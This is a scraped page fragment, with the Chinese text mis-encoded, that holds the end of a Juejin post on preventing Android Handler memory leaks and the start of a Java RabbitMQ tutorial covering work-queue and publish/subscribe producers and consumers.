        <span class="hljs-comment">// ä½†MessageQueueä¸­è¿˜æœ‰æœªå¤„ç†çš„æ¶ˆæ¯å¼•ç”¨ç€Handler</span>
        <span class="hljs-comment">// Handleråˆå¼•ç”¨ç€Activityï¼Œå¯¼è‡´Activityæ— æ³•è¢«å›æ”¶</span>
    }
}
</code></pre>
<p>è§£å†³æ–¹æ¡ˆ</p>
<p>æ–¹æ¡ˆ1ï¼šé™æ€å†…éƒ¨ç±» + å¼±å¼•ç”¨ï¼ˆæœ€å¸¸ç”¨ï¼‰</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> {
    <span class="hljs-keyword">private</span> SafeHandler mSafeHandler;
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        
        <span class="hljs-comment">// åˆ›å»ºå®‰å…¨çš„Handler</span>
        mSafeHandler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SafeHandler</span>(<span class="hljs-built_in">this</span>);
    }
    
    <span class="hljs-comment">// é™æ€å†…éƒ¨ç±»ï¼Œä¸æŒæœ‰å¤–éƒ¨ç±»çš„å¼•ç”¨</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Handler</span> {
        <span class="hljs-comment">// ä½¿ç”¨å¼±å¼•ç”¨æŒæœ‰Activity</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> WeakReference&lt;MainActivity&gt; mActivityRef;
        
        <span class="hljs-keyword">public</span> <span class="hljs-title function_">SafeHandler</span><span class="hljs-params">(MainActivity activity)</span> {
            <span class="hljs-built_in">super</span>(Looper.getMainLooper());
            mActivityRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(activity);
        }
        
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(Message msg)</span> {
            <span class="hljs-type">MainActivity</span> <span class="hljs-variable">activity</span> <span class="hljs-operator">=</span> mActivityRef.get();
            <span class="hljs-keyword">if</span> (activity != <span class="hljs-literal">null</span> &amp;&amp; !activity.isFinishing()) {
                <span class="hljs-comment">// Activityè¿˜å­˜åœ¨ï¼Œå¯ä»¥å®‰å…¨ä½¿ç”¨</span>
                activity.handleMessage(msg);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// Activityå·²è¢«å›æ”¶ï¼Œæ¸…ç†æ¶ˆæ¯</span>
                removeCallbacksAndMessages(<span class="hljs-literal">null</span>);
            }
        }
    }
    
    <span class="hljs-comment">// Activityä¸­çš„å¤„ç†æ–¹æ³•</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(Message msg)</span> {
        <span class="hljs-keyword">switch</span> (msg.what) {
            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
                updateUI();
                <span class="hljs-keyword">break</span>;
        }
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">super</span>.onDestroy();
        <span class="hljs-comment">// æ¸…ç†Handler</span>
        <span class="hljs-keyword">if</span> (mSafeHandler != <span class="hljs-literal">null</span>) {
            mSafeHandler.removeCallbacksAndMessages(<span class="hljs-literal">null</span>);
        }
    }
}
</code></pre>
<p>æ–¹æ¡ˆ2ï¼šä½¿ç”¨Lifecycle + ViewModelï¼ˆç°ä»£Androidæ¶æ„ï¼‰</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-title">extends</span> <span class="hljs-title">AppCompatActivity</span> {
<span class="hljs-comment">// ä½¿ç”¨ViewModel + LiveData</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> handler = Handler(Looper.getMainLooper())
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">doTaskWithDelay</span><span class="hljs-params">(delayMillis: <span class="hljs-type">Long</span>, task: () -&gt; <span class="hljs-type">Unit</span>)</span></span> {
        handler.postDelayed({
            task()
        }, delayMillis)
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCleared</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onCleared()
        <span class="hljs-comment">// ViewModelé”€æ¯æ—¶è‡ªåŠ¨æ¸…ç†</span>
        handler.removeCallbacksAndMessages(<span class="hljs-literal">null</span>)
    }
}

<span class="hljs-comment">// Activityä¸­ä½¿ç”¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> viewModel: MainViewModel <span class="hljs-keyword">by</span> viewModels()
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        
        <span class="hljs-comment">// å®‰å…¨çš„å»¶è¿Ÿä»»åŠ¡</span>
        viewModel.doTaskWithDelay(<span class="hljs-number">30000</span>) {
            updateUI()  <span class="hljs-comment">// å¦‚æœActivityå·²é”€æ¯ï¼Œè¿™é‡Œä¸ä¼šæ‰§è¡Œ</span>
        }
    }
}
</code></pre>
<h2 data-id="heading-11">æ€»ç»“</h2>
<ol>
<li>
<p><strong>ä¸‰ç»„ä»¶å…³ç³»</strong>ï¼š</p>
<p>ä¸€ä¸ªçº¿ç¨‹ â†” ä¸€ä¸ªLooper â†” ä¸€ä¸ªMessageQueue â†” å¤šä¸ªHandler</p>
</li>
<li>
<p><strong>æ¶ˆæ¯å¾ªç¯æµç¨‹</strong>ï¼š</p>
<p>Handlerå‘é€æ¶ˆæ¯ â†’ MessageQueueå…¥é˜Ÿæ’åº â†’ Looperå¾ªç¯å–å‡º â†’ åˆ†å‘å›Handlerå¤„ç†</p>
</li>
<li>
<p><strong>å†…å­˜ç®¡ç†</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨<code>Message.obtain()</code>å¤ç”¨å¯¹è±¡</li>
<li>æ³¨æ„Handlerå†…å­˜æ³„æ¼é—®é¢˜</li>
<li>åŠæ—¶ç§»é™¤ä¸éœ€è¦çš„æ¶ˆæ¯</li>
</ul>
</li>
<li>
<p><strong>é«˜çº§ç‰¹æ€§</strong>ï¼š</p>
<ul>
<li>åŒæ­¥å±éšœç”¨äºä¼˜å…ˆå¤„ç†å¼‚æ­¥æ¶ˆæ¯ï¼ˆå¦‚UIç»˜åˆ¶ï¼‰</li>
<li>IdleHandlerç”¨äºç©ºé—²æ—¶æ‰§è¡Œä»»åŠ¡</li>
<li>Nativeå±‚å®ç°é«˜æ•ˆé˜»å¡å”¤é†’</li>
</ul>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€RabbitMQã€‘å·¥ä½œæ¨¡å¼å®ç°]]></title>    <link>https://juejin.cn/post/7592500570167869475</link>    <guid>https://juejin.cn/post/7592500570167869475</guid>    <pubDate>2026-01-08T05:46:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592500570167869475" data-draft-id="7592531796044857359" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€RabbitMQã€‘å·¥ä½œæ¨¡å¼å®ç°"/> <meta itemprop="keywords" content="åç«¯,RabbitMQ"/> <meta itemprop="datePublished" content="2026-01-08T05:46:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Javaæ°´è§£"/> <meta itemprop="url" content="https://juejin.cn/user/2441349519143037"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€RabbitMQã€‘å·¥ä½œæ¨¡å¼å®ç°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2441349519143037/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Javaæ°´è§£
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T05:46:04.000Z" title="Thu Jan 08 2026 05:46:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€Work Queues ï¼ˆå·¥ä½œé˜Ÿåˆ—æ¨¡å¼ï¼‰</h2>
<p>ç®€å•æ¨¡å¼åœ¨è¿™ä¸ªç³»åˆ—[ç¬¬ä¸€ä¸ªæ–‡ç« ]ï¼Œä¸Šæ‰‹ç¨‹åºå°±æ˜¯ä¸€ä¸ªSimple ï¼ˆç®€å•æ¨¡å¼ï¼‰çš„å®ç°ã€‚</p>
<p><img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/cd90038ad16340b39f7d46bee88ad894~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMjQ0MTM0OTUxOTE0MzAzNyJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1767937422&amp;x-orig-sign=RS1Bu0hUK2qpzaoHhEV8pnX3WY4%3D" alt="&#10;" loading="lazy"/></p>
<p>â¼¯ä½œé˜Ÿåˆ—æ¨¡å¼â½€æŒå¤šä¸ªæ¶ˆè´¹è€…æ¥æ”¶æ¶ˆæ¯ï¼Œæ¶ˆè´¹è€…ä¹‹é—´æ˜¯ç«äº‰å…³ç³»ï¼Œæ¯ä¸ªæ¶ˆæ¯åªèƒ½è¢«â¼€ä¸ªæ¶ˆè´¹è€…æ¥æ”¶ã€‚</p>
<p>æ¯ä¸ªå·¥ä½œæ¨¡å¼çš„å®ç°ï¼Œéƒ½å…ˆéœ€è¦å¼•å…¥RabbitMQçš„ä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.rabbitmq<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>amqp-client<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.7.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

AIå†™ä»£ç xml
12345
</code></pre>
<h3 data-id="heading-1"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>1.1 ç”Ÿäº§è€…</h3>
<p>ç”Ÿäº§è€…ï¼š</p>
<ol>
<li>åˆ›å»ºè¿æ¥</li>
<li>åˆ›å»ºChannel</li>
<li>å£°æ˜â¼€ä¸ªé˜Ÿåˆ—Queue</li>
<li>ç”Ÿäº§æ¶ˆæ¯</li>
<li>é‡Šæ”¾èµ„æº</li>
</ol>

<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> org.example.rabbitmq.workqueues;


<span class="hljs-keyword">import</span> com.rabbitmq.client.Channel;
<span class="hljs-keyword">import</span> com.rabbitmq.client.Connection;
<span class="hljs-keyword">import</span> com.rabbitmq.client.ConnectionFactory;

<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeoutException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProducerDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException {
        <span class="hljs-comment">//å»ºç«‹è¿æ¥</span>
        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">connectionFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();
        connectionFactory.setHost(<span class="hljs-string">"101.43.47.137"</span>);<span class="hljs-comment">//ipåœ°å€</span>
        connectionFactory.setPort(<span class="hljs-number">5672</span>);<span class="hljs-comment">//é»˜è®¤ç«¯å£å·</span>
        connectionFactory.setUsername(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·</span>
        connectionFactory.setPassword(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·å¯†ç </span>
        connectionFactory.setVirtualHost(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//è™šæ‹Ÿä¸»æœº</span>

        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span>  connectionFactory.newConnection();

        <span class="hljs-comment">//å¼€å¯ä¿¡é“</span>
        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();
        <span class="hljs-comment">//å£°æ˜ä¿¡é“</span>
        channel.queueDeclare(<span class="hljs-string">"workQueues"</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">null</span>);

        <span class="hljs-comment">//å£°æ˜é˜Ÿåˆ—,å‘é€æ¶ˆæ¯</span>
        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
            <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">"hello workQueues"</span>+i;
            channel.basicPublish(<span class="hljs-string">""</span>,<span class="hljs-string">"workQueues"</span>,<span class="hljs-literal">null</span>,msg.getBytes());
        }

        System.out.println(<span class="hljs-string">"æ¶ˆæ¯å‘é€æˆåŠŸ"</span>);
        
        <span class="hljs-comment">//èµ„æºé‡Šæ”¾</span>
        channel.close();
        connection.close();
    }
}



AIå†™ä»£ç java
è¿è¡Œ
<span class="hljs-number">123456789101112131415161718192021222324252627282930313233343536373839404142</span>
</code></pre>
<h3 data-id="heading-2"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>1.2 æ¶ˆè´¹è€…</h3>
<p>æˆ‘ä»¬åˆ›å»ºä¸¤ä¸ªæ¶ˆè´¹è€…æ¨¡æ‹Ÿã€‚<br/>
æ¶ˆè´¹è€…ï¼š</p>
<ol>
<li>åˆ›å»ºè¿æ¥</li>
<li>åˆ›å»ºChannel</li>
<li>å£°æ˜ä¸€ä¸ªé˜Ÿåˆ—Queue</li>
<li>æ¶ˆè´¹æ¶ˆæ¯</li>
<li>é‡Šæ”¾èµ„æºï¼Œä¸ºäº†é€ æˆä¸¤ä¸ªæ¶ˆè´¹è€…ç«äº‰ï¼Œæˆ‘ä»¬å…ˆä¸é‡Šæ”¾èµ„æºã€‚</li>
</ol>

<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> org.example.rabbitmq.workqueues;

<span class="hljs-keyword">import</span> com.rabbitmq.client.*;

<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeoutException;


<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Consumer1</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException, InterruptedException {
        <span class="hljs-comment">//å»ºç«‹è¿æ¥</span>
        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">connectionFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();
        connectionFactory.setHost(<span class="hljs-string">"101.43.47.137"</span>);<span class="hljs-comment">//ipåœ°å€</span>
        connectionFactory.setPort(<span class="hljs-number">5672</span>);<span class="hljs-comment">//é»˜è®¤ç«¯å£å·</span>
        connectionFactory.setUsername(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·</span>
        connectionFactory.setPassword(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·å¯†ç </span>
        connectionFactory.setVirtualHost(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//è™šæ‹Ÿä¸»æœº</span>

        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> connectionFactory.newConnection();

        <span class="hljs-comment">//åˆ›å»ºä¿¡é“</span>
        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();
        <span class="hljs-comment">//å£°æ˜é˜Ÿåˆ—</span>
        channel.queueDeclare(<span class="hljs-string">"workQueues"</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">null</span>);
        <span class="hljs-comment">//æ¶ˆè´¹æ¶ˆæ¯</span>
        <span class="hljs-type">DefaultConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConsumer</span>(channel) {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleDelivery</span><span class="hljs-params">(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, <span class="hljs-type">byte</span>[] body)</span> <span class="hljs-keyword">throws</span> IOException {
                System.out.println(<span class="hljs-string">"Consumer1 æ¥æ”¶åˆ°æ¶ˆæ¯: "</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(body));
            }
        };
        channel.basicConsume(<span class="hljs-string">"workQueues"</span>,<span class="hljs-literal">true</span>,consumer);
        Thread.sleep(<span class="hljs-number">100</span>);

        <span class="hljs-comment">////é‡Šæ”¾èµ„æº</span>
        <span class="hljs-comment">//channel.close();</span>
        <span class="hljs-comment">//connection.close();</span>
    }

}


AIå†™ä»£ç java
è¿è¡Œ
<span class="hljs-number">1234567891011121314151617181920212223242526272829303132333435363738394041</span>
</code></pre>
<p>æ•ˆæœï¼š<br/>
<img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/69581e0b745047dcade7c28b3fc719d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMjQ0MTM0OTUxOTE0MzAzNyJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1767937422&amp;x-orig-sign=CitpLP4Q3ZOqZaEmwXeLSelPlgI%3D" alt="&#10;" loading="lazy"/></p>
<h2 data-id="heading-3"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>äºŒã€Publish/Subscribe(å‘å¸ƒ/è®¢é˜…)</h2>
<p><img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/8ef175bde42f4348b8a10e97225bb293~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMjQ0MTM0OTUxOTE0MzAzNyJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1767937422&amp;x-orig-sign=3VbmfVojq9SBD4fHgMuGDHThfIg%3D" alt="&#10;" loading="lazy"/></p>
<p>åœ¨å‘å¸ƒ/è®¢é˜…æ¨¡å‹ä¸­ï¼Œå¤šäº†â¼€ä¸ªExchangeâ»†â¾Šã€‚</p>
<p>Exchange å¸¸â»…æœ‰ä¸‰ç§ç±»å‹ï¼Œåˆ†åˆ«ä»£è¡¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fso.csdn.net%2Fso%2Fsearch%3Fq%3D%25E4%25B8%258D%25E5%2590%258C%25E7%259A%2584%26spm%3D1001.2101.3001.7020" target="_blank" title="https://so.csdn.net/so/search?q=%E4%B8%8D%E5%90%8C%E7%9A%84&amp;spm=1001.2101.3001.7020" ref="nofollow noopener noreferrer">ä¸åŒçš„</a>è·¯ç”±è§„åˆ™ï¼Œä¹Ÿå°±åˆ†åˆ«å¯¹åº”ä¸åŒçš„â¼¯ä½œæ¨¡å¼ï¼š</p>
<ol>
<li>Fanoutï¼šâ¼´æ’­ï¼Œå°†æ¶ˆæ¯äº¤ç»™æ‰€æœ‰ç»‘å®šåˆ°äº¤æ¢æœºçš„é˜Ÿåˆ—(Publish/Subscribeæ¨¡å¼)</li>
<li>Directï¼šå®šå‘ï¼ŒæŠŠæ¶ˆæ¯äº¤ç»™ç¬¦åˆæŒ‡å®šrouting keyçš„é˜Ÿåˆ—(Routingæ¨¡å¼)</li>
<li>Topic:é€šé…ç¬¦ï¼ŒæŠŠæ¶ˆæ¯äº¤ç»™ç¬¦åˆrouting pattern(è·¯ç”±æ¨¡å¼)çš„é˜Ÿåˆ—(Topicsæ¨¡å¼)</li>
</ol>
<h3 data-id="heading-4"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>2.1 ç”Ÿäº§è€…</h3>
<p>ç”Ÿäº§è€…</p>
<ol>
<li>åˆ›å»ºè¿æ¥</li>
<li>åˆ›å»ºä¿¡é“</li>
<li>å£°æ˜äº¤æ¢æœº</li>
<li>å£°æ˜ä¸¤ä¸ªé˜Ÿåˆ—</li>
<li>äº¤æ¢æœºä¸é˜Ÿåˆ—è¿›è¡Œç»‘å®š</li>
<li>ç”Ÿäº§æ¶ˆæ¯</li>
<li>é‡Šæ”¾èµ„æº</li>
</ol>
<p>å£°æ˜äº¤æ¢æœºçš„æ–¹æ³•æ˜¯Channelç±»ä¸‹çš„exchangeDeclareæ–¹æ³•<br/>
